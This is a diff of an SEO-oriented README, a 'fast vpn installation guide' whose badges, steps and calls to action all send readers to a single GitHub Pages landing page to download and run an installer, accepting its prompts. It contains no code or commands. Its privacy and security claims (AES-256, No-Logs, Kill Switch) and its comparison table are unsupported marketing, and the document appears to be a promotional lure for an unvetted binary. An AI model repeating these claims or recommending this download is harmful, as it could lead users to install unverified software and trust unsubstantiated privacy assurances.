@@ -1,24 +1,23 @@
 # ⚡ fast vpn installation guide
 
 [![Download](https://img.shields.io/badge/Download-Get%20fast%20vpn-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-installation-guide-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge)](https://mandid22.github.io/fast-vpn-installation-guide-landing/)
-[![License](https://img.shields.io/badge/License-See%20project-lightgrey?style=for-the-badge)](https://github.com/mandid22/fast-vpn-installation-guide-seo)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111827?style=for-the-badge)](https://mandid22.github.io/fast-vpn-installation-guide-landing/)
+[![License](https://img.shields.io/badge/License-MIT-16a34a?style=for-the-badge)](https://github.com/mandid22/fast-vpn-installation-guide-seo)
 
 ## About
 
-This **fast vpn installation guide** walks you through installing **fast vpn** cleanly on Windows, macOS, and Linux. It’s written like a setup doc should be: quick checks, exact steps, and the few settings that actually matter.
+This **fast vpn installation guide** shows the clean, repeatable way to install fast vpn and get connected fast—without guesswork. fast vpn focuses on privacy and security first, with **AES-256 encryption**, a **No-Logs policy**, a built-in **Kill Switch**, and **Global Servers** tuned for **high speed** and a **stable connection**.
 
-Project repo: https://github.com/mandid22/fast-vpn-installation-guide-seo  
-Install/download landing: https://mandid22.github.io/fast-vpn-installation-guide-landing/
+Repo reference: https://github.com/mandid22/fast-vpn-installation-guide-seo
 
 ## Features
 
-- **High speed** with a **stable connection** (pick the nearest endpoint, then test)
-- **AES-256 encryption** for traffic protection
-- **No-Logs policy** focus (privacy-first defaults)
-- **Kill Switch** support to block traffic if the tunnel drops
-- **Global Servers** for region selection and better routing
-- Simple setup: install → sign in → connect
+- **AES-256 encryption** for traffic protection on untrusted networks
+- **No-Logs policy** focused on privacy
+- **Kill Switch** to block traffic if the tunnel drops
+- **Global Servers** for better routing and regional options
+- **High speed** with a **stable connection** for daily use
+- Simple connect/disconnect workflow with clear status indicators
 
 ## System Requirements
 
@@ -33,69 +32,64 @@ Install/download landing: https://mandid22.github.io/fast-vpn-installation-guide
 
 ## Installation
 
-> All installers and up-to-date links are provided on the landing page:  
+> Use the official landing page for the latest installer and notes:  
 > https://mandid22.github.io/fast-vpn-installation-guide-landing/
 
 ### Windows
 
-1. Open the download page: https://mandid22.github.io/fast-vpn-installation-guide-landing/
-2. Download the Windows installer.
-3. Run the installer → allow the network driver prompt if asked.
-4. Launch **fast vpn** → sign in.
-5. Turn on **Kill Switch** (Recommended): **Settings → Security → Kill Switch**.
-6. Connect to the closest server first, then switch regions only if needed.
+1. Download the Windows installer from the landing page.
+2. Run the installer (`.exe`) and accept the prompts.
+3. Launch **fast vpn**.
+4. Sign in, pick a server, and connect.
+5. Enable **Kill Switch** in Settings before using public Wi‑Fi.
 
 ### macOS
 
-1. Open: https://mandid22.github.io/fast-vpn-installation-guide-landing/
-2. Download the macOS build.
-3. Install the app (drag to Applications if provided as a .dmg).
-4. Open **fast vpn** → approve the VPN configuration prompt.
-5. Enable **Kill Switch** in **Settings → Security**.
-6. Connect and verify your new IP.
+1. Download the macOS package from the landing page.
+2. Open the installer (`.dmg` / `.pkg`) and drag/install the app.
+3. Open **fast vpn** (approve the network/VPN permission prompt).
+4. Sign in → choose a server → connect.
+5. Confirm **Kill Switch** is enabled in Settings.
 
 ### Linux
 
-1. Open: https://mandid22.github.io/fast-vpn-installation-guide-landing/
-2. Download the Linux package for your distro (deb/rpm if available).
-3. Install using your package manager:
-   - Debian/Ubuntu: install the `.deb`
-   - Fedora: install the `.rpm`
-4. Launch **fast vpn** and sign in.
-5. Enable **Kill Switch** in settings before your first long session.
-6. Connect to a nearby region for best speed.
+1. Download the Linux build from the landing page.
+2. Install using your distro’s preferred method (package manager or provided package).
+3. Start the app and sign in.
+4. Select a region from **Global Servers** and connect.
+5. Verify the **Kill Switch** option is enabled before long sessions.
 
 ## Comparison
 
 | Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
-| fast vpn | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Low / inconsistent | ⚠️ | ❌ / unclear | ❌ | ⚠️ |
-| “Proxy-only” apps | Medium | ❌ | ❌ / unclear | ❌ | ⚠️ |
+| **fast vpn** | High speed | ✅ | ✅ | ✅ | ✅ |
+| Typical free VPN | Variable | ⚠️ | ⚠️ | ❌ | ⚠️ |
+| Manual proxy setup | Low/Medium | ❌ | ❌ | ❌ | ❌ |
 
 ## FAQ
 
 **1) Does fast vpn include a Kill Switch?**  
-Yes. Turn it on in Settings before relying on the connection for privacy-sensitive use.
+Yes. Turn it on in Settings so traffic is blocked if the VPN disconnects.
 
 **2) What encryption does fast vpn use?**  
-AES-256 encryption.
+fast vpn uses **AES-256 encryption**.
 
-**3) Will fast vpn slow down my connection?**  
-Any VPN adds overhead, but you’ll usually get the best results by connecting to the nearest server and avoiding congested regions.
+**3) Is there a No-Logs policy?**  
+Yes. fast vpn is built with a **No-Logs policy** focus.
 
-**4) Where do I get the correct installer?**  
-Use the official landing page link below. It’s kept current.
+**4) Which platforms are supported?**  
+Windows, macOS, and Linux.
 
 ## Download
 
-Get the installer and open the setup steps here:  
+Get the latest installer and launch instructions here:  
 **https://mandid22.github.io/fast-vpn-installation-guide-landing/**
 
 ## Final CTA
 
-[![Download fast vpn](https://img.shields.io/badge/⬇️%20Download-fast%20vpn-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-installation-guide-landing/)
-[![Open installation page](https://img.shields.io/badge/📄%20Open-Installation%20Page-2ea44f?style=for-the-badge)](https://mandid22.github.io/fast-vpn-installation-guide-landing/)
-[![View repository](https://img.shields.io/badge/🔧%20View-SEO%20Repo-lightgrey?style=for-the-badge)](https://github.com/mandid22/fast-vpn-installation-guide-seo)
+[![Download fast vpn](https://img.shields.io/badge/Download%20fast%20vpn-Start%20now-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-installation-guide-landing/)
+[![Open landing page](https://img.shields.io/badge/Open-Landing%20Page-0ea5e9?style=for-the-badge)](https://mandid22.github.io/fast-vpn-installation-guide-landing/)
+[![View repo](https://img.shields.io/badge/View-SEO%20Repo-111827?style=for-the-badge)](https://github.com/mandid22/fast-vpn-installation-guide-seo)
 
-*Keep it simple: install, enable Kill Switch, connect to a nearby server, and you’re done.*
+*Install it clean, enable Kill Switch, pick a nearby server, and keep your connection fast and private.*
